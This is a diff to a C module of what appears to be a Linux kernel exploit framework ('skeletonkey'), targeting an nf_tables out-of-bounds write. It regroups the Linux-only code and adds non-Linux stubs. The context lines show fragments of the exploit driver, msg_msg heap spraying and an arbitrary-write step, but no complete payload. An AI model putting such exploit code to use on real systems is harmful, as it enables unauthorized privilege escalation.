@@ -43,16 +43,20 @@
 
 #include "skeletonkey_modules.h"
 #include "../../core/registry.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdbool.h>
+#include <unistd.h>
+
+#ifdef __linux__
+
 #include "../../core/kernel_range.h"
 #include "../../core/offsets.h"
 #include "../../core/finisher.h"
 
-#include <stdio.h>
-#include <stdlib.h>
 #include <stdint.h>
-#include <string.h>
-#include <stdbool.h>
-#include <unistd.h>
 #include <sched.h>
 #include <fcntl.h>
 #include <errno.h>
@@ -585,7 +589,6 @@ static int bring_lo_up(void)
     return 0;
 }
 
-#ifdef __linux__
 static size_t build_trigger_batch(uint8_t *batch, uint32_t *seq)
 {
     size_t off = 0;
@@ -596,7 +599,6 @@ static size_t build_trigger_batch(uint8_t *batch, uint32_t *seq)
     put_batch_end(batch, &off, (*seq)++);
     return off;
 }
-#endif
 
 /* ------------------------------------------------------------------
  * --full-chain arb-write context. The technique:
@@ -616,8 +618,6 @@ static size_t build_trigger_batch(uint8_t *batch, uint32_t *seq)
  * the shared finisher's sentinel-file post-check to flag layout
  * mismatches as SKELETONKEY_EXPLOIT_FAIL rather than fake success.
  * ------------------------------------------------------------------ */
-
-#ifdef __linux__
 
 #define SPRAY_QUEUES_ARB        32
 
@@ -721,8 +721,6 @@ static int nft_fwd_dup_arb_write(uintptr_t kaddr,
     return 0;
 }
 
-#endif /* __linux__ */
-
 /* ------------------------------------------------------------------
  * Exploit driver.
  * ------------------------------------------------------------------ */
@@ -748,11 +746,6 @@ static skeletonkey_result_t nft_fwd_dup_exploit(const struct skeletonkey_ctx *ct
         return pre;
     }
 
-#ifndef __linux__
-    fprintf(stderr, "[-] nft_fwd_dup: linux-only exploit; non-linux build\n");
-    (void)ctx;
-    return SKELETONKEY_PRECOND_FAIL;
-#else
     if (!ctx->json) {
         if (ctx->full_chain) {
             fprintf(stderr, "[*] nft_fwd_dup: --full-chain — trigger + OOB-write "
@@ -946,7 +939,6 @@ static skeletonkey_result_t nft_fwd_dup_exploit(const struct skeletonkey_ctx *ct
         fprintf(stderr, "[-] nft_fwd_dup: unexpected child rc=%d\n", rc);
     }
     return SKELETONKEY_EXPLOIT_FAIL;
-#endif /* __linux__ */
 }
 
 /* ------------------------------------------------------------------
@@ -958,7 +950,6 @@ static skeletonkey_result_t nft_fwd_dup_cleanup(const struct skeletonkey_ctx *ct
     if (!ctx->json) {
         fprintf(stderr, "[*] nft_fwd_dup: cleaning up sysv queues + log\n");
     }
-#ifdef __linux__
     /* Best-effort drain of any leftover msg queues with IPC_PRIVATE
      * key owned by us. SysV doesn't enumerate by key, but msgctl
      * IPC_STAT walks /proc/sysvipc/msg to find them. */
@@ -979,12 +970,37 @@ static skeletonkey_result_t nft_fwd_dup_cleanup(const struct skeletonkey_ctx *ct
         }
         fclose(f);
     }
-#endif
     if (unlink("/tmp/skeletonkey-nft_fwd_dup.log") < 0 && errno != ENOENT) {
         /* harmless */
     }
     return SKELETONKEY_OK;
 }
+
+#else  /* !__linux__ */
+
+/* Non-Linux dev builds: nf_tables / NETLINK_NETFILTER / SysV msg_msg
+ * groom — all Linux-only kernel surface. Stub out so the module still
+ * registers and the top-level `make` completes on macOS/BSD dev boxes. */
+static skeletonkey_result_t nft_fwd_dup_detect(const struct skeletonkey_ctx *ctx)
+{
+    if (!ctx->json)
+        fprintf(stderr, "[i] nft_fwd_dup: Linux-only module "
+                "(nf_tables HW-offload OOB) — not applicable here\n");
+    return SKELETONKEY_PRECOND_FAIL;
+}
+static skeletonkey_result_t nft_fwd_dup_exploit(const struct skeletonkey_ctx *ctx)
+{
+    (void)ctx;
+    fprintf(stderr, "[-] nft_fwd_dup: Linux-only module — cannot run here\n");
+    return SKELETONKEY_PRECOND_FAIL;
+}
+static skeletonkey_result_t nft_fwd_dup_cleanup(const struct skeletonkey_ctx *ctx)
+{
+    (void)ctx;
+    return SKELETONKEY_OK;
+}
+
+#endif /* __linux__ */
 
 /* ------------------------------------------------------------------
  * Embedded detection rules.
